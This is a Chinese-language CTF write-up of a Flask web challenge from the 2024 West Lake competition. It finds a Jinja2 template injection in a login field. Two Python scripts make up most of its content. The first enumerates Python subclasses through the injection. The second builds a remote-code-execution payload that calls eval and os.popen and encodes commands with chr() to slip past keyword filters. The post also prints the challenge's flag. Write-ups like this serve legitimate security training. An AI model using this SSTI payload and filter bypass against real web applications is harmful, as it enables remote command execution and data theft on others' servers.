---
title: 2024年西湖论剑 WEB 赛道 Flask 题目 Writeup
published: 2025-03-13
description: ''
image: ''
tags: ['WEB','CTF','Python']
category: 'CTF Writeup'
draft: false 
lang: ''
---

## 题目分析

通过初步分析，发现目标页面是基于 Flask 框架开发的，页面中存在潜在的模板注入漏洞（Jinja2 SSTI）。

![页面截图](https://gu-blog-img.gmoe.cc/20250314003845267.png)

通过抓包工具，获取到两个关键的请求地址：
- 登录请求：`http://139.155.126.78:18534/login`
- 密码验证：`http://139.155.126.78:18534/cpass`

在登录页面中随意输入用户名后，响应内容中出现了类似 `123313` 的字符串，结合页面特征，推测存在 Jinja2 模板注入漏洞，形如 `{{xxx}}`。

![响应截图](https://gu-blog-img.gmoe.cc/20250314003954896.png)

## 解题思路

### 1. 确定漏洞点

通过构造特定的 SSTI Payload，尝试触发异常或获取敏感信息。初步目标是通过 `{{}}` 枚举 Python 内置类的子类，寻找可利用的对象。

### 2. 枚举子类

编写脚本，枚举 `().__class__.__bases__[0].__subclasses__()` 中的子类，寻找可以执行系统命令的类（如 `os` 或 `subprocess`）。

```python
import requests
import time
import html

url = "http://139.155.126.78:26914/login"
url_2 = "http://139.155.126.78:26914/cpass"

payload_2 = {"password": "admin"}

for i in range(0, 300):
    time.sleep(0.06)
    payload = {
        "phone_number": "{{().__class__.__bases__[0].__subclasses__()[" + str(i) + "]}}",
    }
    response = requests.post(url, data=payload)
    response_2 = requests.post(url_2, data=payload_2)
    decoded_html = html.unescape(response_2.text)
    print(decoded_html)
    if "_frozen_importlib.BuiltinImporter" in response_2.text:
        print(response_2.text)
        print(i)
        break
```

运行脚本后，发现第 `133` 个子类 `_frozen_importlib.BuiltinImporter` 可用，说明可以通过该类进一步构造 Payload 执行命令。

### 3. 构造命令执行 Payload

在后续分析中，发现目标系统对输入进行了关键字过滤，直接使用命令字符串（如 `ls /`）会被拦截。因此，需要通过 ASCII 编码绕过过滤机制。

首先，将目标命令（如 `head -c 40 /flagf149`）转换为 ASCII 码，然后使用 `chr()` 函数拼接字符串，构造最终 Payload。

```python
import requests
import html

url = "http://139.155.126.78:18534/login"
url_2 = "http://139.155.126.78:18534/cpass"

# 将命令转换为 ASCII 码绕过过滤
string = "head -c 40 /flagf149"
ascii_values = [ord(char) for char in string]
chr_values = "".join([f"chr({char})+" for char in ascii_values])[:-1]

payload = {
    "phone_number": "{{[].__class__.__base__.__subclasses__()[133].__init__.__globals__['__builtins__'].eval(\"__import__('os').popen(" + chr_values + ").read()\")}}"
}

payload_2 = {"password": "admin"}

response = requests.post(url, data=payload)
response_2 = requests.post(url_2, data=payload_2)
decoded_html = html.unescape(response_2.text)
print(decoded_html)

# 保存响应内容为 HTML 文件，便于调试
with open('tste.html', 'w') as f:
    f.write(decoded_html)
```

### 4. 运行结果

运行脚本后，成功获取到目标文件 `/flagf149` 的内容。

![运行截图1](https://gu-blog-img.gmoe.cc/20250314004401304.png)
![运行截图2](https://gu-blog-img.gmoe.cc/20250314004432252.png)

## 最终 Flag

```
DASCTF{54872121243038318161691629509234}
```
